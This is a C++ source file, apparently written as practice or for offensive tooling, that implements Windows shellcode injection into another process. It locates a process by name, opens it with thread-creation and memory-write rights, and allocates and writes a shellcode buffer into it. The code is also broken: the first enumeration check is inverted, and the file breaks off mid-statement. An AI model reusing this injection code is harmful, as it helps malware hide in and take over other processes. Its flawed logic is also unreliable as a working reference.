#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <tchar.h>

BOOL GetRemoteProcessHandle(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess) {
	//according to the documentation:
	//before calling the Process32First function, set this member to sizeof(PROCESSENTRY32)
	// if dwsize is not initialized,  process32first fail
	PROCESSENTRY32 procEntry = { 0 };
	procEntry.dwSize = sizeof(PROCESSENTRY32);

	//takes s snapshot of the currently running processes
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		std::wcerr << L"[!] CreateToolhelp32Snapshot Failed with error : " << GetLastError() << std::endl;
		return FALSE;
	}
	BOOL found = FALSE;

	//retrieves information about the first process encountered in the snapshot
	if (!Process32First(hSnapshot, &procEntry)) {
		do {
			//use the dot operator to extract the process name from the populated struct
			//if the process name matches the process were looking for
			if (_wcsicmp(procEntry.szExeFile, szProcessName) == 0) {
				//use the dot operator to extract the process ID from the populated struct
				//save the PID
				*dwProcessId = procEntry.th32ProcessID;

				//open handler to the process
				*hProcess = OpenProcess(
					PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
					FALSE,
					procEntry.th32ProcessID
				);
				if (*hProcess == NULL) {
					std::wcerr << L"[!] Openprocess failed with error : " << GetLastError() << std::endl;
					return FALSE;
				}
				found = TRUE;
				break;
			}
		} while (Process32Next(hSnapshot, &procEntry));
	}
	CloseHandle(hSnapshot);
	return found;
}

BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode) {
	PVOID pShellcodeAddress = NULL;
	SIZE_T sNumberOfBytesWritten = 0;
	DWORD dwOldProtection = NULL;

	//allocate memory in the remote process of size sSizeOfShellcode
	pShellcodeAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (!pShellcodeAddress) {
		std::wcerr << L"[!] VirtualAllocEx Failed with process : " << GetLastError() << std::endl;
		return FALSE;
	}
	std::wcout << L"ALlocated Memory at : 0x" << pShellcodeAddress << std::endl;

	//write the shellcode in the allocated memory
	if (!WriteProcessMemory(hProcess, pShellcodeAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
		std::wcerr << L"[!] WriteProcessMemory Failed with error : " << GetLastError() << std::endl;
		return FALSE;
	}
	std::wcout << L""
}